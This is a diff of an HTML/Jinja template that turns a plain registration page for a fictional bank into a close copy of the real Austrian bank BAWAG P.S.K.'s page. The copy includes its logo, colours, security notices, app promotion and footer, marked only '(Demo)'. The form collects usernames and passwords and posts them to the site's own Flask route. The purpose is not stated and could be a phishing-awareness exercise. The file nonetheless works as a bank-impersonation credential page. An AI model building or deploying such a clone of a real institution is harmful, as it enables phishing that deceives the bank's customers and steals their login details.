@@ -1,37 +1,104 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registrierung - Wien ONline-Bank</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Registrierung - Wien ONline-Bank</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --red: #9d0000;
+      --light-bg: #d0f4f1;
+    }
+    * {margin:0;padding:0;box-sizing:border-box;font-family:"Roboto",sans-serif;}
+    body {display:flex;flex-direction:column;min-height:100vh;background:#fafafa;}
+    header {display:flex;justify-content:space-between;align-items:center;padding:8px 32px;font-size:14px;border-bottom:4px solid var(--red);background:#fff;}
+    header .lang-switch a {margin-left:8px;text-decoration:none;color:#000;padding:4px 8px;border-radius:4px;}
+    header .lang-switch a.active {background:#e2e2e2;}
+    main {flex:1;display:flex;flex-wrap:wrap;}
+    .login-box {width:360px;max-width:100%;background:#fff;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.15);padding:32px;margin:32px;}
+    .login-box h2 {font-size:22px;margin-bottom:16px;color:#000;}
+    .form-group {margin-bottom:16px;position:relative;}
+    input[type="text"],input[type="password"] {width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:16px;}
+    .eye {position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;color:#666;}
+    button.login-btn {width:100%;padding:12px;background:var(--red);border:none;color:#fff;font-size:16px;border-radius:4px;cursor:pointer;margin-top:8px;}
+    .forgot {font-size:14px;margin-top:16px;display:block;color:var(--red);text-decoration:none;}
+    .banner {flex:1;background:var(--light-bg) url("https://images.unsplash.com/photo-1532074205216-d0e1f6d83e12?auto=format&fit=crop&w=700&q=80") no-repeat right bottom/contain;position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;padding:40px 24px;}
+    .overlay-menu {position:absolute;top:20px;left:50%;transform:translateX(-50%);background:#fff;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.15);padding:24px;display:flex;gap:48px;font-size:14px;max-width:80%;}
+    .overlay-menu h3 {font-size:16px;margin-bottom:8px;color:#000;}
+    .overlay-menu ul {list-style:none;}
+    .overlay-menu li {margin-bottom:4px;}
+    .promo {max-width:320px;}
+    .promo h1 {font-size:32px;font-weight:700;margin-bottom:16px;line-height:1.2;}
+    .promo button {padding:12px 24px;background:var(--red);color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;}
+    footer {font-size:14px;text-align:center;padding:16px 8px;background:#f7f7f7;}
+    footer a {margin:0 8px;color:#000;text-decoration:none;}
+  </style>
 </head>
-<body class="bg-light">
-    <header class="bg-primary text-white text-center py-3 mb-4">
-        <img src="{{ url_for('static', filename='logo.png') }}" alt="Wien ONline-Bank Logo" height="40">
-    </header>
-    <div class="container">
-        <div class="row justify-content-center">
-            <div class="col-md-4">
-                <div class="card p-4">
-                    <h2 class="h4 mb-3 text-center">Registrierung</h2>
-                    {% if error %}<p class="text-danger">{{ error }}</p>{% endif %}
-                    <form method="post">
-                        <div class="mb-3">
-                            <input type="text" name="username" class="form-control" placeholder="Benutzername" required>
-                        </div>
-                        <div class="mb-3">
-                            <input type="password" name="password" class="form-control" placeholder="Passwort" required>
-                        </div>
-                        <button type="submit" class="btn btn-primary w-100">Registrieren</button>
-                    </form>
-                    <div class="text-center mt-2">
-                        <a href="{{ url_for('login') }}">Zurück zum Login</a>
-                    </div>
-                </div>
-            </div>
-        </div>
+<body>
+  <header>
+    <div style="display:flex;align-items:center;gap:12px">
+      <img src="{{ url_for('static', filename='bawag.png') }}" alt="BAWAG Logo" style="height:40px" />
+      <span id="dateTime"></span>
     </div>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <div class="lang-switch">
+      <a href="#" class="active">DE</a>
+      <a href="#">EN</a>
+      <a href="#">BKS</a>
+      <a href="#">TR</a>
+    </div>
+  </header>
+  <main>
+    <div class="login-box">
+      <h2>Registrierung</h2>
+      {% if error %}<p class="text-danger">{{ error }}</p>{% endif %}
+      <form method="post" action="{{ url_for('register') }}">
+        <div class="form-group">
+          <input type="text" name="username" placeholder="Benutzername" required />
+        </div>
+        <div class="form-group">
+          <input id="pinInput" type="password" name="password" placeholder="Passwort" required />
+          <span class="eye" onclick="toggleEye()">👁️</span>
+        </div>
+        <button class="login-btn" type="submit">Registrieren</button>
+      </form>
+      <a href="{{ url_for('login') }}" class="forgot">Zurück zum Login</a>
+    </div>
+    <section class="banner">
+      <div class="overlay-menu">
+        <div><h3>Sicherheit</h3><ul><li>Die BAWAG versendet keine E-Mails mit direkten eBanking Login-Links!</li><li><a href="#">Mehr Infos</a></li></ul></div>
+        <div><h3>Service &amp; Info</h3><ul><li><a href="#">Sicherheitsregeln</a></li><li><a href="#">Anmeldung / Erste Schritte</a></li><li><a href="#">3D Secure Online Bezahlung</a></li></ul></div>
+        <div><h3>Support</h3><ul><li><a href="#">FAQ</a></li><li><a href="#">Zu Watchlist Internet</a></li></ul></div>
+      </div>
+      <div class="promo">
+        <h1>Kartenlimits flexibel anpassen<br />mit der BAWAG&nbsp;App.</h1>
+        <button>App downloaden</button>
+      </div>
+    </section>
+  </main>
+  <footer>
+    <a href="#">Impressum</a>
+    <a href="#">AGB</a>
+    <a href="#">Datenschutz</a>
+    <a href="#">Nutzungsbedingungen</a>
+    <a href="#">Barrierefrei</a>
+    <br />© BAWAG P.S.K. (Demo)
+  </footer>
+  <script>
+    function updateDateTime() {
+      const dt = document.getElementById('dateTime');
+      const now = new Date();
+      const options = { weekday: 'long', day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+      dt.textContent = now.toLocaleString('de-AT', options);
+    }
+    updateDateTime();
+    setInterval(updateDateTime, 1000);
+    function toggleEye() {
+      const input = document.getElementById('pinInput');
+      const show = input.type === 'password';
+      input.type = show ? 'text' : 'password';
+      document.querySelector('.eye').textContent = show ? '🙈' : '👁️';
+    }
+  </script>
 </body>
 </html>
